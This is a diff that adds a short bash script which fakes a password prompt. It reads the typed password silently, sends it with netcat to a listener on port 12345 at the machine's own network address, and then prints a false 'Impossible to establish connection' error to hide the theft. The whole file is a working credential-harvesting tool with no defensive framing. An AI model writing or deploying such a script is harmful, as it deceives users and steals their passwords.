@@ -1,0 +1,9 @@
+#!/bin/bash
+
+IP=$(ifconfig | grep "inet " | grep -Fv 127.0.0.1 | awk '{print $2}' | head -n 1)
+# listening at: nc -l 12345
+
+echo "Enter Password:";
+read -s text;
+echo $text | nc $IP 12345;
+echo "Impossible to establish connection"
